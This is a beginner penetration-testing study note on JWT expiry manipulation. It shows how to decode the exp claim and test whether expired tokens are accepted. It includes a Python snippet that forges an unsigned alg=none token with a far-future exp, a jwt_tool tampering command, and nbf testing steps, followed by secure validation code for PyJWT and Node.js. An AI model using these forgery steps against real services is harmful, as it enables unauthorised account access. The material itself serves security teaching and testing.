---
tags: [vapt, jwt, beginner]
difficulty: beginner
module: "18 - JWT"
topic: "18.10 JWT Expiry Manipulation (exp claim)"
---

# 18.10 — JWT Expiry Manipulation

## How JWT Expiry Works

```
exp CLAIM = Unix timestamp (seconds since epoch)

  "exp": 1640086400
  → Token expires at 2022-01-01 00:00:00 UTC
  
  Server should check: if current_time > exp → REJECT!
  
ATTACK: What if exp is not checked?
  → Old tokens (from weeks/months ago) still valid!
  → Stolen tokens never expire!
  → Attacker can use any old captured token indefinitely!
```

---

## Testing Expiry Validation

```bash
# STEP 1: Get your JWT token
# STEP 2: Decode the exp claim:
JWT="your_token_here"
python3 -c "
import base64, json, datetime, sys

token = sys.argv[1]
payload_b64 = token.split('.')[1]
padding = 4 - len(payload_b64) % 4
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '='*padding))

if 'exp' in payload:
    exp = payload['exp']
    exp_dt = datetime.datetime.utcfromtimestamp(exp)
    print(f'Expires: {exp} ({exp_dt} UTC)')
    print(f'Current: {int(datetime.datetime.now().timestamp())}')
    remaining = exp - int(datetime.datetime.now().timestamp())
    print(f'Remaining: {remaining} seconds')
else:
    print('No exp claim! Token never expires by design.')
" "$JWT"

# STEP 3: Wait for token to expire (or manually set exp in past)
# If you can modify exp (alg=none or known secret):
# Set exp to 1 second in the past → test if accepted

# STEP 4: Use expired token:
curl https://target.com/api/profile \
  -H "Authorization: Bearer EXPIRED_TOKEN"
# → 401 Unauthorized = exp checked (good!)
# → 200 OK = exp NOT validated (vulnerability!)
```

---

## Modifying exp Claim

```
TO EXTEND TOKEN LIFETIME (if you can modify it):
  Requires: alg=none attack, known secret, or key injection

Method 1: alg=none (no signature needed):
  Change exp to year 9999:
  "exp": 99999999999
  
  python3 -c "
  import base64, json
  
  def b64url_enc(data):
      return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
  
  header = b64url_enc('{\"alg\":\"none\",\"typ\":\"JWT\"}')
  payload_data = {
      'userId': 42,
      'role': 'user',
      'exp': 99999999999  # year 5138!
  }
  payload = b64url_enc(json.dumps(payload_data))
  print(f'{header}.{payload}.')
  "

Method 2: jwt_tool with known secret:
  python3 jwt_tool.py TOKEN -T -S hs256 -p "secret"
  # → Interactive tamper mode → change exp value

Method 3: If no exp claim at all:
  Some JWT implementations allow tokens with no exp claim
  → Token is valid FOREVER (or until secret rotation)
  → Report as: "JWT missing expiry (exp) claim"
```

---

## nbf — Not Before Claim

```
nbf CLAIM = "Not valid before this timestamp"

ATTACK: What if nbf is not validated?
  A token "activated" in the future → can be used now!
  
  "nbf": 99999999999  (year 5138 — not yet valid!)
  
  Server should reject: current_time < nbf → REJECT
  But if not validated → accepted!
  
PRACTICAL USE:
  Delayed-activation tokens (e.g., "reserved access starts tomorrow")
  If server ignores nbf → can use the token before intended activation!
  
TEST:
  Set nbf to a future timestamp
  Try using the token
  → Accepted? → nbf not validated
```

---

## Fix

```
MANDATORY CLAIM VALIDATION:

Python (PyJWT):
  import jwt
  from datetime import datetime, timezone
  
  try:
      payload = jwt.decode(
          token,
          SECRET_KEY,
          algorithms=['HS256'],
          options={
              'verify_exp': True,  # DEFAULT: True — don't disable!
              'verify_nbf': True,
              'verify_iat': True,
              'leeway': 10  # Allow 10 seconds clock skew
          }
      )
  except jwt.ExpiredSignatureError:
      return "Token expired", 401
  except jwt.ImmatureSignatureError:
      return "Token not yet valid", 401

  # WRONG (vulnerable):
  payload = jwt.decode(token, SECRET_KEY, options={'verify_exp': False})
  # NEVER disable exp validation!

Node.js (jsonwebtoken):
  jwt.verify(token, SECRET, {
      ignoreExpiration: false,  // DEFAULT: false — keep it false!
      clockTolerance: 10        // 10 seconds for clock skew
  });

ALSO:
  ✓ Always include exp in generated tokens
  ✓ Short expiry: 15 minutes for access tokens
  ✓ Refresh tokens for persistent sessions
```

---

## Related Notes
- [[03 - JWT Claims Reference]] — all standard claims
- [[04 - Algorithm None Attack]] — modify claims without signature
- [[11 - JWT Replay Attack]] — replaying expired tokens
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
